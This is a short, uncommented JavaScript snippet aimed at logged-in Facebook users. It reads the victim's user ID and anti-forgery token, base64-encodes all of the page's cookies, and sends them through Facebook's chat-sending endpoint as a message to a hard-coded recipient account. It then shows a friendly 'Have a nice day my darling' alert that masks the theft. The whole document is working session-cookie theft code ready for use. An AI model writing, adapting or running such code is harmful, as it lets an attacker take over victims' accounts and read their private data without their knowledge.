var friend = '123456789';
var fbid = document.cookie.match(/c_user=(\d+)/)[1];
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var msg = btoa(document.cookie);
var params = "message_batch[0][action_type]=ma-type:user-generated-message&message_batch[0][thread_id]&message_batch[0][author]=fbid:"+fbid+"&message_batch[0][author_email]&message_batch[0][timestamp]=1435067821557&message_batch[0][timestamp_absolute]=Hoy&message_batch[0][timestamp_relative]=9:57&message_batch[0][timestamp_time_passed]=0&message_batch[0][is_unread]=false&message_batch[0][is_forward]=false&message_batch[0][is_filtered_content]=false&message_batch[0][is_spoof_warning]=false&message_batch[0][source]=source:chat:web&message_batch[0][source_tags][0]=source:chat&message_batch[0][body]="+msg+"&message_batch[0][has_attachment]=false&message_batch[0][html_body]=false&&message_batch[0][specific_to_list][0]=fbid:"+friend+"&message_batch[0][specific_to_list][1]=fbid:"+fbid+"&message_batch[0][signatureID]=1e81757d&message_batch[0][ui_push_phase]=V3&message_batch[0][status]=0&message_batch[0][message_id]=<1435067821557:1288831367-1415946503@mail.projektitan.com>&message_batch[0][manual_retry_cnt]=0&message_batch[0][client_thread_id]=user:"+friend+"&client=mercury&__user="+fbid+"&__a=1&__dyn=7Am8RW8BgCBymfDgDxiWEyx97xN6yUgByVbGAEG8DDirWU8ponUDAyoeAq8zUK5Uc-dwIxbxjy9A8GqcEwy8ACxt7oiyXSiVWw&__req=1c&fb_dtsg="+fb_dtsg+"&ttstamp=2658170701115548905710511469&__rev=1799518";
var tani = new XMLHttpRequest();
tani.open("POST","https://www.facebook.com/ajax/mercury/send_messages.php",false);
tani.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
tani.send(params);
alert("Have a nice day my darling... :)");
